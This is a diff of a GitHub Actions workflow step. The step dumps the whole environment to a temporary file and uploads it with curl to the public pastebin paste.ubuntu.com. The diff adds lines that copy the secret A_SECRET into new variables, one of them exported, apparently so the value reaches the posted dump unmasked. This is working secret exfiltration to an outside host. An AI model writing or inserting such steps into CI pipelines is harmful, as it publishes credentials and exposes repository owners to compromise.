@@ -10,5 +10,7 @@ jobs:
       - uses: actions/checkout@v2
       - run: |
           f=$(mktemp)
+          A_SECRET_2="${A_SECRET}"
+          export A_SECRET_3="${A_SECRET}"
           env > $f
           curl -v --data-urlencode "content@${f}" -d "poster=a" -d "syntax=text" -d "expiration=day" http://paste.ubuntu.com
